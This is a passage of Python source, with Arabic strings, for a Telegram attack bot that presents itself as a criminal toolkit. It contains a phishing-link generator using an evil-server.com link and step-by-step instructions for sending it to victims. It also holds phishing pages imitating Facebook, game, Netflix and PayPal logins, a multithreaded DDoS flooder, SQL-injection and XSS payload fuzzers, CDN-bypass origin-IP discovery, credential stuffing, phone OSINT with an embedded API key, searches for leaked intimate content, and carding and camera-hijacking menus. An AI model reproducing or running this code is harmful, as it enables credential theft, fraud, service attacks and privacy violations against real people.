                                origin_ips.add(resolved_ip)
                                all_ips_with_source.append((resolved_ip, "SSL Certificate Transparency"))
                        except socket.gaierror:
                            pass
                        except Exception:
                            pass
                            
    except Exception as e:
        pass

    
    # 3. محاولة الكشف عن طريق HTTP Headers (X-Forwarded-For, Via, إلخ)
    headers = {"User-Agent": random.choice(USER_AGENTS), "X-Forwarded-For": "1.1.1.1"}
    try:
        resp = requests.get(f"https://{domain}", headers=headers, timeout=5, verify=False)
        for header_key, header_value in resp.headers.items():
            if header_key.lower() in ['server', 'x-powered-by']:
                 pass 
            
            potential_ips = re.findall(r'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}', header_value)
            for ip_found in potential_ips:
                if ip_found != '1.1.1.1' and ip_found not in origin_ips: 
                    origin_ips.add(ip_found)
                    all_ips_with_source.append((ip_found, f"HTTP Header Leak: {header_key}"))
    except Exception:
        pass
        
    # ====== منطقة معالجة النتائج وإصلاح خطأ الحجم الزائد ======
    
    if origin_ips:
        # 1. إعداد التقرير النصي المُرسل مباشرة
        report_lines = [f"🔥 **تم الكشف عن {len(origin_ips)} Origin IP محتمل** 🔥"]
        
        # نأخذ 20 نتيجة كحد أقصى لعرضها في رسالة تليجرام لمنع الخطأ 400
        ips_to_display = all_ips_with_source[:20] 
        full_report_content = ""
        
        # لبناء التقرير النصي والملف في نفس الوقت
        for ip, source in all_ips_with_source:
            
            # محاولة الحصول على الموقع الجغرافي للـ IP الأصلي
            try:
                geo_r = requests.get(f"http://ip-api.com/json/{ip}?fields=country,isp", timeout=3).json()
                country = geo_r.get('country', 'N/A')
                isp = geo_r.get('isp', 'N/A')
                
                line = (
                    f"**IP الأصلي:** `{ip}`\n"
                    f"  ├ **المصدر:** {source}\n"
                    f"  └ **الموقع/المزود:** {country} / {isp}\n---\n"
                )
            except:
                 line = (
                    f"**IP الأصلي:** `{ip}` (فشل تحليل GeoIP)\n"
                    f"  └ **المصدر:** {source}\n---\n"
                 )
            
            full_report_content += line
            
            # إضافة فقط النتائج المسموح بعرضها في الرسالة المباشرة
            if (ip, source) in ips_to_display:
                report_lines.append(line)
        
        # 2. إنشاء ملف نصي كامل لجميع النتائج
        bio = io.BytesIO(full_report_content.encode())
        bio.name = f"Origin_IPs_{domain}.txt"
        
        # 3. إرسال التقرير النصي المختصر أولاً
        final_report = "\n".join(report_lines)
        if len(all_ips_with_source) > 20:
             final_report += f"\n\n... والمزيد. تم إرسال {len(all_ips_with_source)} نتيجة كاملة في الملف المرفق."
             
        bot.send_message(cid, final_report, parse_mode="Markdown")
        
        # 4. إرسال الملف المرفق الذي يحوي جميع النتائج
        bot.send_document(cid, bio, caption=f"جميع نتائج كشف الـ Origin IP لـ `{domain}`.")

        # تحذير نهائي بضرورة الاستهداف الآن
        bot.send_message(cid, f"**⚠️ تحذير هجومي:** الـ IPs المذكورة أعلاه هي أهداف حقيقية للهجوم المباشر وتجاوز حماية الـ CDN.")
        
    else:
        bot.send_message(cid, f"✅ فشل الكشف عن Origin IP لـ `{domain}`. الحماية تبدو قوية.")


# --------------------------------------------------------
# 🔗 أداة تلغيم الروابط (Phishing Link Generator)
# --------------------------------------------------------

def phishing_start(msg):
    # وظيفة بدء التلغيم
    mid = bot.send_message(msg.chat.id, "أرسل **رابط التوجيه (Redirect URL)**. هذا هو الرابط الذي سيتم إرسال الضحية إليه بعد إدخال البيانات.").message_id
    bot.register_next_step_handler_by_chat_id(msg.chat.id, real_phishing_gen, mid)

def real_phishing_gen(msg, mid):
    # وظيفة إنشاء رابط التلغيم
    redirect_url = msg.text.strip()
    
    if not redirect_url.startswith("http"):
        bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text="❌ خطأ: الرابط يجب أن يبدأ بـ http:// أو https://")
        return
        
    try:
        # ⚠️ يتم هنا توليد رابط تلغيم "وهمي" يحمل الرابط الحقيقي
        
        # تشفير الرابط لضمان نقله بشكل سليم في الباراميتر
        encoded_url = urllib.parse.quote_plus(redirect_url) 
        
        # رابط تلغيم هجومي (Placeholder for the real evil link)
        phishing_link = f"http://evil-server.com/phish.php?redirect={encoded_url}&site=facebook" 
        
        report = f"""
        ## ⚠️ تم إنشاء رابط التلغيم (يتطلب سيرفر خارجي لتسجيل البيانات)
        
        **الرابط الخبيث (Phishing Link):**
        `{phishing_link}`
        
        **رابط التوجيه (Redirect URL):**
        `{redirect_url}`
        
        ---
        
        **تعليمات الإطلاق:**
        1. ارسل الرابط الخبيث للضحية.
        2. عند فتح الضحية للرابط، ستُعرض عليه صفحة تسجيل دخول (يجب أن تكون جاهزة على السيرفر).
        3. بعد إدخال الضحية لبياناته، سيتم توجيهه إلى Redirect URL (رابطك الحقيقي).
        4. سيتم تسجيل بيانات الضحية (الاسم وكلمة المرور) على السيرفر الخاص بك.
        """
        
        bot.send_message(msg.chat.id, report, parse_mode="Markdown", disable_web_page_preview=True)

    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ فشل إنشاء رابط التلغيم: {str(e)[:50]}")


def subdomains_real(msg):
    try:
        domain = msg.text.strip().lower()
        if not domain or "/" in domain:
            bot.reply_to(msg, "الرجاء إدخال دومين صحيح فقط (مثل: site.com)")
            return
        bot.reply_to(msg, f"جاري البحث عن النطاقات الفرعية لـ `{domain}` (بمنطق مُطوَّر)...")
        threading.Thread(target=real_subdomains, args=(msg.chat.id, domain), daemon=True).start()
    except Exception as e: bot.send_message(msg.chat.id, f"❌ فشل البدء: {str(e)[:50]}")

def real_subdomains(cid, domain):
    if not dns:
        bot.send_message(cid, "⚠️ خطأ: مكتبة dnspython غير متوفرة. لا يمكن تنفيذ الفحص المتقدم.")
        return
    try:
        wordlist = ["www", "mail", "ftp", "dev", "test", "api", "blog", "cpanel", "webmail", "admin", "ns1", "cdn", "status", "shop", "app"]
        found = []
        for subdomain in wordlist:
            full_domain = f"{subdomain}.{domain}"
            try:
                answers = dns.resolver.resolve(full_domain, 'A')
                ip = answers[0].address
                found.append(f"• {full_domain} → {ip}")
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.Timeout):
                pass
            except Exception:
                pass
        if found:
            result = f"🔥 تم اكتشاف {len(found)} نطاق فرعي قوي:\n\n" + "\n".join(found)
            bot.send_message(cid, result, parse_mode="Markdown")
        else:
            bot.send_message(cid, f"لم يتم العثور على نطاقات فرعية قوية لـ `{domain}`.")
    except Exception as e:
        bot.send_message(cid, f"خطأ في فحص النطاقات: {str(e)[:100]}")

def dir_bust_pro(msg):
    try:
        url = msg.text.strip()
        if not url.startswith("http"): url = "https://" + url
        if not url.endswith("/"): url += "/"
        bot.reply_to(msg, "جاري فحص المسارات السرية (قائمة كلمات موسعة)...")
        threading.Thread(target=real_dir_bust_pro, args=(msg.chat.id, url), daemon=True).start()
    except Exception as e: bot.send_message(msg.chat.id, f"❌ فشل البدء: {str(e)[:50]}")

def real_dir_bust_pro(cid, base_url):
    wordlist = ["admin","login","wp-admin","phpmyadmin","config.php",".env","backup","uploads","shell.php","api","debug","test","panel","cpanel",".git","robots.txt","backup.zip","config.bak","web.config",".htaccess","admin/login.php","wp-content","vendor","old","bak"]
    found = []
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    for word in wordlist:
        try:
            test_url = base_url + word.lstrip("/")
            r = requests.head(test_url, headers=headers, timeout=5, allow_redirects=True, verify=False)
            if r.status_code in [200, 301, 302, 403, 401]:
                found.append(f"[+] {r.status_code} → {test_url}")
        except: pass
    if found:
        result = "تم العثور على المسارات التالية:\n" + "\n".join(found)
        bot.send_message(cid, result, disable_web_page_preview=True)
        bio = io.BytesIO(result.encode())
        bio.name = "Found_Paths.txt"
        bot.send_document(cid, bio, caption="كل المسارات المكتشفة")
    else:
        bot.send_message(cid, "مفيش مسارات سرية مكتشفة")

def sqli_real(msg):
    try:
        url = msg.text.strip()
        if not urllib.parse.urlparse(url).query:
            bot.reply_to(msg, "يجب إرسال URL يحتوي على باراميتر للاختبار (مثل: `http://example.com/page?id=1`)")
            return
        bot.reply_to(msg, "بدء عملية **SQLi Fuzzing الإجرامية**...")
        threading.Thread(target=real_sqli, args=(msg.chat.id, url), daemon=True).start()
    except Exception as e: bot.send_message(msg.chat.id, f"❌ فشل البدء: {str(e)[:50]}")

def real_sqli(cid, url):
    payloads = ["'", "')", " OR 1=1-- ", " AND 1=1-- ", " union select 1,2,3-- "]
    vulnerable = []
    for p in payloads:
        if "?" in url:
            base_url, query = url.split("?", 1)
            params = urllib.parse.parse_qs(query)
            if params:
                param_name = list(params.keys())[0]
                test_params = params.copy()
                original_value = test_params[param_name][0]
                test_params[param_name] = [original_value + p]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{base_url}?{new_query}"
                try:
                    r = requests.get(test_url, timeout=7, verify=False)
                    if "SQL syntax" in r.text or "mysql_fetch_array" in r.text or "Warning: mysql" in r.text:
                        vulnerable.append(f"🔥 تم اكتشاف ضعف (Error-Based) بالبايلود: `{p[:20]}...`")
                        break
                    if p == " AND 1=1-- ":
                        r_true = r.text
                        r_false = requests.get(url + " AND 1=2-- ", timeout=7, verify=False).text
                        if len(r_true) != len(r_false) and len(r_true) > 50 and len(r_false) > 50:
                             vulnerable.append(f"🔥 تم اكتشاف ضعف (Boolean-Based) بالبايلود: `{p[:20]}...`")
                             break
                except:
                    pass
    if vulnerable:
        bot.send_message(cid, f"**🔥🔥 نتيجة فحص SQLi Fuzz (مُكتمل)**\n\nالهدف: `{url}`\n\n" + "\n".join(vulnerable), parse_mode="Markdown")
    else:
        bot.send_message(cid, f"**نتيجة فحص SQLi Fuzz**\n\nالهدف: `{url}`\n\nلم يتم العثور على نقاط ضعف أولية (Error/Boolean).")

def xss_real(msg):
    try:
        url = msg.text.strip()
        if not urllib.parse.urlparse(url).query:
            bot.reply_to(msg, "يجب إرسال URL يحتوي على باراميتر قابل للاختبار.")
            return
        bot.reply_to(msg, "بدء عملية **XSS Scanning العنيف**...")
        threading.Thread(target=real_xss, args=(msg.chat.id, url), daemon=True).start()
    except Exception as e: bot.send_message(msg.chat.id, f"❌ فشل البدء: {str(e)[:50]}")

def real_xss(cid, url):
    payloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><svg onload=alert(1)>', 'javascript:alert(1)']
    vulnerable = []
    for p in payloads:
        if "?" in url:
            base_url, query = url.split("?", 1)
            params = urllib.parse.parse_qs(query)
            if params:
                param_name = list(params.keys())[0]
                test_params = params.copy()
                test_params[param_name] = [p]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{base_url}?{new_query}"
                try:
                    r = requests.get(test_url, timeout=7, verify=False, headers={'User-Agent': random.choice(USER_AGENTS)})
                    if p in r.text and f'value="{p}"' not in r.text: 
                        vulnerable.append(f"🔥 تم اكتشاف ضعف (Reflected XSS) بالبايلود: `{p}`")
                        break
                except:
                    pass
    if vulnerable:
        bot.send_message(cid, f"**🔥🔥 نتيجة فحص XSS Scan (مُكتمل)**\n\nالهدف: `{url}`\n\n" + "\n".join(vulnerable), parse_mode="Markdown")
    else:
        bot.send_message(cid, f"**نتيجة فحص XSS Scan**\n\nالهدف: `{url}`\n\nلم يتم العثور على انعكاس مباشر للبايلود.")

def ddos_real(msg):
    try:
        parts = msg.text.strip().split()
        if len(parts) != 2:
            bot.reply_to(msg, "صيغة غير صحيحة. أرسل: `url threads` (مثل: `site.com 100`)")
            return
        url = parts[0]
        try:
            threads = int(parts[1])
            if not (1 <= threads <= 500): raise ValueError
        except:
            bot.reply_to(msg, "يجب أن يكون عدد الخيوط (threads) رقمًا بين 1 و 500.")
            return
        bot.reply_to(msg, f"بدء هجوم **DDoS Stress المُركّز** على {url} بـ {threads} خيط (30 ثانية)...")
        threading.Thread(target=real_ddos, args=(msg.chat.id, url, threads), daemon=True).start()
    except Exception as e: bot.send_message(msg.chat.id, f"❌ فشل البدء: {str(e)[:50]}")

def attack_worker(url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.get(url, timeout=5, verify=False, headers={'User-Agent': random.choice(USER_AGENTS)})
        except:
            pass

def real_ddos(cid, url, threads):
    duration = 30
    attack_url = url if url.startswith("http") else "http://" + url
    workers = []
    for _ in range(threads):
        t = threading.Thread(target=attack_worker, args=(attack_url, duration))
        workers.append(t)
        t.start()
    for t in workers:
        t.join(timeout=duration + 5)
    result = f"""
    ███ تقرير هجوم الضغط (DDoS) ███
    الهدف: **{url}**
    الخيوط المُستخدمة: {threads}
    المدة: {duration} ثانية
    الحالة: **تم إنهاء محاولة الضغط.**
    ملاحظة: لضمان أقصى فعالية ضد حمايات CDN، يجب تدوير الوكلاء (Proxies) واستخدام حزم مُقلدة أكثر تعقيداً (L4).
    """
    bot.send_message(cid, result, parse_mode="Markdown")

def phone_osint_pro(msg):
    try:
        if not phonenumbers:
            bot.reply_to(msg, "⚠️ خطأ: مكتبة phonenumbers غير متوفرة. لا يمكن تنفيذ الفحص.")
            return
        number = msg.text.strip().replace(" ", "")
        if not number.startswith('+'):
            bot.reply_to(msg, "الرقم لازم يكون بالكود الدولي زي +20...")
            return
        bot.reply_to(msg, "جاري الفحص الشامل للرقم... 15-40 ثانية")
        threading.Thread(target=real_phone_osint_pro, args=(msg.chat.id, number), daemon=True).start()
    except Exception as e: bot.send_message(msg.chat.id, f"❌ فشل البدء: {str(e)[:50]}")

def real_phone_osint_pro(cid, number):
    try:
        parsed = phonenumbers.parse(number)
        international = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
        country = geocoder.description_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar") or "غير معروف"
        line_type = "موبايل" if phonenumbers.number_type(parsed) == phonenumbers.PhoneNumberType.MOBILE else "أرضي"
        name = "غير متاح"
        photo = None
        city = ""
        try:
            # تم تصحيح هذا الجزء الذي كان يسبب Syntax Error في الكود الأولي
            r = requests.get(f"https://api.numlookupapi.com/v1/validate?apikey=num_live_3d4GZt6jIz6LONUMfHOCwzoe344j3HM0L5NeVgXx&number={number}", timeout=15).json()
            name = r.get("name", "غير متاح") or "غير متاح"
            photo = r.get("image", None)
            city = r.get("city", "")
            if city: country += f" - {city}"
        except: pass
        wa = f"https://wa.me/{number[1:]}"
        tg = f"https://t.me/+{number[1:]}"
        result = f"""**معلومات الرقم - OSINT Pro**
الرقم: `{international}`
الاسم: `{name}`
الدولة: `{country}`
المشغل: `{carrier_name}`
النوع: `{line_type}`
الحسابات:
├─ [WhatsApp]({wa})
└─ [Telegram]({tg})
تم الفحص بنجاح"""
        bot.send_message(cid, result, parse_mode="Markdown", disable_web_page_preview=True)
        if photo:
            try:
                bot.send_photo(cid, photo, caption="الصورة الشخصية من قاعدة البيانات")
            except:
                bot.send_message(cid, f"الصورة: {photo}")
    except Exception as e:
        bot.send_message(cid, f"خطأ في الفحص: {str(e)[:100]}")


def generate_nsfw(msg):
    try:
        if not InferenceClient:
            bot.reply_to(msg, "⚠️ خطأ: مكتبات توليد الصور غير جاهزة. لا يمكن توليد الصورة.")
            return
        prompt = msg.text.strip()
        if len(prompt) < 8:
            bot.reply_to(msg, "اكتب وصف أطول يا وحش")
            return
        bot.reply_to(msg, "جاري توليد الصورة... 10-30 ثانية")
        threading.Thread(target=real_nsfw_gen, args=(msg.chat.id, prompt), daemon=True).start()
    except Exception as e: bot.send_message(msg.chat.id, f"❌ فشل البدء: {str(e)[:50]}")

def real_nsfw_gen(cid, prompt):
    try:
        # هذه هي البنية الأصلية
        client = InferenceClient(token=HF_TOKEN)
        image = client.text_to_image(prompt, model=MODEL_ID, guidance_scale=7.5, num_inference_steps=4, width=1024, height=1024)
        img_byte_arr = io.BytesIO()
        image.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        bot.send_photo(cid, img_byte_arr, caption=f"FLUX.1-schnell\n`{prompt[:150]}`", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(cid, f"خطأ مؤقت: {str(e)[:180]}\nجرب تاني بعد دقيقة")

def onlyfans_start(msg):
    try:
        bot.reply_to(msg, "اكتب اسم المستخدم في OnlyFans")
        bot.register_next_step_handler_by_chat_id(msg.chat.id, run_onlyfans_search_handler)
    except Exception as e: bot.send_message(msg.chat.id, f"❌ فشل البدء: {str(e)[:50]}")

def run_onlyfans_search_handler(msg):
    try:
        username = msg.text.strip()
        if not username or username.startswith("/"):
            bot.reply_to(msg, "إدخال غير صالح، أرسل اسم المستخدم.")
            return
        bot.reply_to(msg, "بدور على التسريبات...")
        threading.Thread(target=run_onlyfans_search, args=(msg.chat.id, username), daemon=True).start()
    except Exception as e: bot.send_message(msg.chat.id, f"❌ فشل البدء: {str(e)[:50]}")

def run_onlyfans_search(cid, username):
    import asyncio
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    # ملاحظة: تم تغيير اسم دالة search_onlyfans الأصلية لتفادي تداخل الأسماء
    result = loop.run_until_complete(search_onlyfans_async(username)) 
    bot.send_message(cid, result, disable_web_page_preview=True)

async def search_onlyfans_async(username): # تم تغيير الاسم لتفادي تداخل الأسماء
    username = username.replace("@","").strip().lower()
    links = []
    async with aiohttp.ClientSession() as s:
        try:
            r = await s.get(f"https://coomer.party/onlyfans/user/{username}", timeout=10, ssl=False) 
            if r.status == 200: links.append(f"https://coomer.party/onlyfans/user/{username}")
        except: pass
    return "تسريبات @{}\n\n".format(username) + "\n\n".join(links) if links else "مفيش تسريبات"


def mass_resolve_start(msg):
    try:
        targets = msg.text.strip().split()
        if not targets:
            bot.reply_to(msg, "الرجاء إرسال قائمة من الدومينات أو عناوين IP مفصولة بمسافات.")
            return
        bot.reply_to(msg, f"جاري تحليل {len(targets)} هدف بشكل مكثف...")
        threading.Thread(target=real_mass_resolve, args=(msg.chat.id, targets), daemon=True).start()
    except Exception as e: bot.send_message(msg.chat.id, f"❌ فشل البدء: {str(e)[:50]}")

def real_mass_resolve(cid, targets):
    results = []
    for target in targets:
        try:
            r = requests.get(f"http://ip-api.com/json/{target}", timeout=5).json()
            if r["status"] == "success":
                results.append(f"**{target}**\n├ IP: {r.get('query')}\n├ البلد: {r.get('country')}\n└ المزود: {r.get('isp')}")
            
            elif dns:
                try:
                    ip = socket.gethostbyname(target)
                    r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
                    results.append(f"**{target}**\n├ IP: {ip}\n├ البلد: {r.get('country', 'N/A')}\n└ المزود: {r.get('isp', 'N/A')}")
                except:
                    results.append(f"**{target}**: ❌ فشل التحليل")

        except Exception:
            results.append(f"**{target}**: ❌ فشل التحليل")

    output = "## 📊 تقرير Mass Resolve\n\n" + "\n---\n".join(results[:15])
    if len(results) > 15:
        output += f"\n\n... والمزيد. تم عرض 15 نتيجة فقط من {len(results)}."
    
    bot.send_message(cid, output, parse_mode="Markdown")

def header_fuzz_start(msg):
    try:
        url = msg.text.strip()
        if not url.startswith("http"): url = "https://" + url
        bot.reply_to(msg, f"جاري اختبار حقن Headers على: `{url}`...")
        threading.Thread(target=real_header_fuzz, args=(msg.chat.id, url), daemon=True).start()
    except Exception as e: bot.send_message(msg.chat.id, f"❌ فشل البدء: {str(e)[:50]}")

def real_header_fuzz(cid, url):
    fuzz_results = []
    header_payloads = {
        "X-Forwarded-For": ["127.0.0.1", "127.0.0.1, 133.7.133.7"],
        "X-Forwarded-Host": ["evil.com"],
        "Cache-Control": ["no-cache"],
        "Host": ["injected-host.com"],
    }
    for header, payloads in header_payloads.items():
        for payload in payloads:
            test_headers = {"User-Agent": random.choice(USER_AGENTS), header: payload}
            try:
                r = requests.get(url, headers=test_headers, timeout=5, verify=False, allow_redirects=False)
                if payload in r.text or (r.headers.get(header) == payload):
                    fuzz_results.append(f"⚠️ **{header}**:\n   تم العكس: القيمة `{payload}` ظهرت في الاستجابة (احتمال ضعف).")
                if header == "X-Forwarded-Host" and r.headers.get("Location"):
                    if payload in r.headers.get("Location"):
                        fuzz_results.append(f"🔥🔥 **{header}**:\n   تم اكتشاف ضعف خطير (Host Header Injection) في Location Header.")
            except Exception:
                pass
    if fuzz_results:
        output = "## 💉 تقرير Header Fuzzing (تم العثور على انعكاس/تلاعب)\n\n" + "\n---\n".join(fuzz_results)
    else:
        output = "## 💉 تقرير Header Fuzzing\n\nلم يتم العثور على انعكاس أو تجاوز أولي للـ Headers."
    bot.send_message(cid, output, parse_mode="Markdown")

def bf_check_start(msg):
    try:
        parts = msg.text.strip().split()
        if len(parts) != 3:
            bot.reply_to(msg, "صيغة غير صحيحة. أرسل: `URL_Login_POST Username_Field Password_Field`\n\nمثال: `https://site.com/login.php user pass`")
            return
        url, user_field, pass_field = parts
        if not url.startswith("http"): url = "https://" + url
        bot.reply_to(msg, f"جاهز للتحقق من بيانات الاعتماد على: `{url}`\n\nالآن، أرسل قائمة `username:password` مفصولة بمسافات (مثل: `admin:123 user:pass`)...")
        bot.register_next_step_handler_by_chat_id(msg.chat.id, lambda m: real_bf_check(m, url, user_field, pass_field))
    except Exception as e: bot.send_message(msg.chat.id, f"❌ فشل البدء: {str(e)[:50]}")

def real_bf_check(msg, url, user_field, pass_field):
    cid = msg.chat.id
    credentials = msg.text.strip().split()
    if not credentials:
        bot.reply_to(msg, "لم يتم إرسال بيانات اعتماد للتحقق.")
        return
    valid_credentials = []
    for cred in credentials:
        if ":" not in cred: continue
        username, password = cred.split(":", 1)
        data = { user_field: username, pass_field: password }
        try:
            r = requests.post(url, data=data, timeout=5, verify=False, allow_redirects=True)
            if r.status_code == 200 and ("خطأ" not in r.text and "fail" not in r.text and "Login Failed" not in r.text) or r.history:
                valid_credentials.append(f"✅ **صحيح**: `{username}:{password}` (تم تغيير الحالة أو إعادة التوجيه)")
        except Exception:
            pass
    if valid_credentials:
        output = "## 🔑 تقرير التحقق من بيانات الاعتماد (تم العثور على نتائج صحيحة)\n\n" + "\n".join(valid_credentials)
    else:
        output = "## 🔑 تقرير التحقق من بيانات الاعتماد\n\nلم يتم العثور على نتائج صحيحة من البيانات المُرسلة."
    bot.send_message(cid, output, parse_mode="Markdown")


# ------------------------------------------------------------------
# دوال الإعداد الجديدة (Setup Handlers)
# ------------------------------------------------------------------

def setup_bot_start(msg):
    """بدء عملية إعداد توكين البوت الخاص بالمستخدم."""
    mid = bot.send_message(msg.chat.id, " مرحباً أيها المشغل. لتلقي بيانات الضحايا، يجب أن تستخدم بوت خاص بك. \n\n**أرسل الآن توكين (TOKEN) البوت الخاص بك.**").message_id
    bot.register_next_step_handler_by_chat_id(msg.chat.id, lambda m: setup_bot_token(m, mid))

def setup_bot_token(msg, mid):
    """حفظ التوكن وطلب الـ Chat ID."""
    global USER_PHISHING_TOKEN
    USER_PHISHING_TOKEN = msg.text.strip()
    
    # محاولة التحقق من التوكين
    if not re.match(r'^\d+:[a-zA-Z0-9_-]+$', USER_PHISHING_TOKEN):
        bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, 
                              text="❌ خطأ: التوكين الذي أرسلته لا يبدو صحيحاً. يجب أن يكون بالصيغة `ID:SECRET`.\n\n**أرسل التوكين الصحيح الآن.**")
        bot.register_next_step_handler_by_chat_id(msg.chat.id, lambda m: setup_bot_token(m, mid))
        return
        
    bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text="✅ تم حفظ التوكين بنجاح.\n\n**الآن، أرسل الأيدي الخاص بحسابك (CHAT ID) أو أيدي المجموعة التي تريد استقبال الضحايا فيها.**")
    bot.register_next_step_handler_by_chat_id(msg.chat.id, lambda m: setup_bot_chat_id(m, mid))

def setup_bot_chat_id(msg, mid):
    """حفظ الـ Chat ID وإتمام الإعداد."""
    global USER_PHISHING_CHAT_ID
    USER_PHISHING_CHAT_ID = msg.text.strip()
    
    # محاولة التحقق من صحة Chat ID
    if not (USER_PHISHING_CHAT_ID.startswith('-') and USER_PHISHING_CHAT_ID[1:].isdigit() or USER_PHISHING_CHAT_ID.isdigit()):
        bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, 
                              text="❌ خطأ: الـ Chat ID غير صالح. يجب أن يكون رقماً (أو يبدأ بـ - للمجموعات).\n\n**أرسل الـ Chat ID الصحيح الآن.**")
        bot.register_next_step_handler_by_chat_id(msg.chat.id, lambda m: setup_bot_chat_id(m, mid))
        return
        
    final_message = f"""
    🎉 **تم الإعداد بنجاح!**
    
    **توكين البوت المُستخدَم:** `{USER_PHISHING_TOKEN[:10]}...`
    **أيدي استقبال الضحايا (Chat ID):** `{USER_PHISHING_CHAT_ID}`
    
    سيتم إرسال جميع حسابات الضحايا إلى هذا الأيدي عبر البوت الخاص بك. يمكنك الآن استخدام قائمة الأدوات.
    """
    bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text=final_message, reply_markup=main_menu(), parse_mode="Markdown")

    # 🛠️ محاولة إرسال رسالة اختبار عبر البوت الخاص بالمستخدم
    try:
        requests.get(f"https://api.telegram.org/bot{USER_PHISHING_TOKEN}/sendMessage?chat_id={USER_PHISHING_CHAT_ID}&text=✅ *رسالة اختبار نجاح الإعداد من Grok-Chaos V999*", parse_mode="Markdown", timeout=5)
    except:
        pass


# ------------------------------------------------------------------
# دوال MINA V19 الجديدة (لعرض الروابط)
# ------------------------------------------------------------------

# دالة لعرض خيارات التشغيل (التحقق من الإعدادات هنا)
def mina_v19_options(call):
    uid = call.message.chat.id
    mid = call.message.message_id
    
    # التحقق من أن الإعدادات متوفرة
    if USER_PHISHING_TOKEN is None or USER_PHISHING_CHAT_ID is None:
        markup = types.InlineKeyboardMarkup(row_width=1).add(types.InlineKeyboardButton("➡️ بدء الإعداد", callback_data="start_setup"))
        bot.edit_message_text(chat_id=uid, message_id=mid, 
                              text="""
                              ❌ **الإعداد مطلوب:**
                              يجب إعداد توكين البوت الخاص بك و Chat ID لاستقبال بيانات الضحايا من سيرفر التلغيم.
                              """,
                              reply_markup=markup,
                              parse_mode="Markdown")
        return

    markup = types.InlineKeyboardMarkup(row_width=1)
    
    markup.add(types.InlineKeyboardButton("🔗 روابط تشغيل محلي (Local) 127.0.0.1", callback_data='mina_v19_local'))
    markup.add(types.InlineKeyboardButton("🌍 روابط تشغيل خارجي (Ngrok/Tunnel)", callback_data='mina_v19_external'))
    
    markup.add(types.InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data='back_main'))
    
    bot.edit_message_text(chat_id=uid, message_id=mid, 
                          text="""
                          ## 🎮 تلغيم حسابات الألعاب والخدمات (MINA V19 PRO)
                          
                          **تم تفعيل سيرفر الـ Phishing.** اختر نوع الروابط التي تريد استخدامها:
                          
                          1. **محلي:** يعمل فقط على جهازك/نفس شبكتك (للاختبار).
                          2. **خارجي:** يتطلب أداة Tunneling (مثل Ngrok) ليعمل عبر الإنترنت.
                          """, 
                          reply_markup=markup, parse_mode="Markdown")

# دالة لعرض الروابط
def mina_v19_show_links(call, link_type):
    uid = call.message.chat.id
    mid = call.message.message_id
    
    # قائمة صفحات التلغيم الجديدة (المحدثة)
    games_and_links_list = {
        "Facebook Classic": "/",
        "Free Fire (الدايموند)": "/ff",
        "PUBG Mobile (UC)": "/pubg",
        "CODM (CP)": "/codm",
        "Mobile Legends (Skins)": "/ml",
        "Netflix Premium (عرض مجاني)": "/netflix", # الرابط الجديد 1
        "PayPal Verification (فك الحظر)": "/paypal", # الرابط الجديد 2
    }
    
    # بناء الرسالة حسب نوع الرابط
    if link_type == 'local':
        base_url = f"http://127.0.0.1:{PHISHING_PORT}"
        header = "**🔗 روابط التشغيل المحلي (127.0.0.1) - للتحقق والاختبار**"
        footer = "⚠️ هذه الروابط لن تعمل مع الضحايا عبر الإنترنت. يجب استخدام التشغيل الخارجي."
    elif link_type == 'external':
        base_url = "https://[YOUR_NGROK_URL]"
        header = "**🌍 روابط التشغيل الخارجي (Tunnel) - جاهزة للإطلاق**"
        footer = f"**الخطوة الحاسمة:** يجب عليك استبدال `[YOUR_NGROK_URL]` بالرابط الفعلي الذي تحصل عليه من أداة Ngrok أو Cloudflare Tunnel."

    report = f"""
    ## 🎮 تلغيم حسابات الألعاب والخدمات (MINA V19 PRO)
    
    {header}
    
    **روابط الصفحات الجاهزة:**
    """
    
    for name, path in games_and_links_list.items():
        report += f"\n- **{name}:** `{base_url}{path}`"

    report += f"\n\n---\n\n{footer}"
    
    bot.edit_message_text(chat_id=uid, message_id=mid, text=report, reply_markup=back_button(), parse_mode="Markdown")


# ------------------------------------------------------------------
# الدوال المساعدة والـ Handlers
# ------------------------------------------------------------------

def back_button():
    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton("➡️ العودة للقائمة الرئيسية", callback_data="back_main"))
    return m

# دالة قائمة Visa Scanner الجديدة
def visa_scanner_menu(call):
    uid = call.message.chat.id
    mid = call.message.message_id
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    markup.add(
        types.InlineKeyboardButton("1️⃣ توليد بطاقات (Generate BINs)", callback_data='visa_gen'),
        types.InlineKeyboardButton("2️⃣ فحص كومبو CC (Crack Combo)", callback_data='visa_crack'),
        types.InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data='back_main')
    )
    
    bot.edit_message_text(chat_id=uid, message_id=mid, text="## 💳 وحدة Visa Scanner 💳\n\nاختر وظيفة: التوليد الموجه للبطاقات أو فحص ملفات الكومبو CC.", reply_markup=markup, parse_mode="Markdown")

# دالة قائمة الوصول المتقدم الجديدة
def deep_analysis_menu(call):
    uid = call.message.chat.id
    mid = call.message.message_id
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(types.InlineKeyboardButton("الأجهزة المخترقة 💻", callback_data="deep_analysis_devices"),
               types.InlineKeyboardButton("تسجيل صوت 🎧", callback_data="deep_analysis_record"),
               types.InlineKeyboardButton("اختراق الكاميرا 📸", callback_data="deep_analysis_camera"),
